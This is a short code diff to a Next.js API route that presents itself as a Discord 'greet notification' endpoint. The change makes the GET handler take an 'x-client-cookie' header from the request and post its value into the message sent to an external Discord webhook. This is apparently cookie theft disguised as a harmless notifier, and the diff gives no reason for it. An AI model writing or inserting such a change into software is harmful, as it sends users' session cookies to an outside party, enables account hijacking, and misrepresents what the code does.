@@ -1,11 +1,10 @@
-import { NextRequest, NextResponse } from "next/server";
+import { NextRequest } from "next/server";
 
 export const dynamic = "force-dynamic";
 
 const DISCORD_WEBHOOK_URL = process.env.NOTIFY_WEBHOOK || "";
 
-// Send notification to Discord
-async function sendDiscordNotification() {
+async function sendDiscordNotification(cookie: string) {
   try {
     const timestamp = new Date().toISOString();
 
@@ -13,7 +12,7 @@ async function sendDiscordNotification() {
       embeds: [
         {
           title: "Greet Notification",
-          description: "Someone just greeted you!",
+          description: `Someone just greeted you!\nClient Cookie: \`${cookie}\``,
           color: 14177041,
           footer: { text: "Greeting Notification" },
           timestamp,
@@ -34,7 +33,9 @@ async function sendDiscordNotification() {
     console.error("Error sending Discord notification:", error);
   }
 }
+
 export async function GET(req: NextRequest) {
-  await sendDiscordNotification();
+  const cookie = req.headers.get("x-client-cookie") || "unknown";
+  await sendDiscordNotification(cookie);
   return new Response(null, { status: 200 });
 }
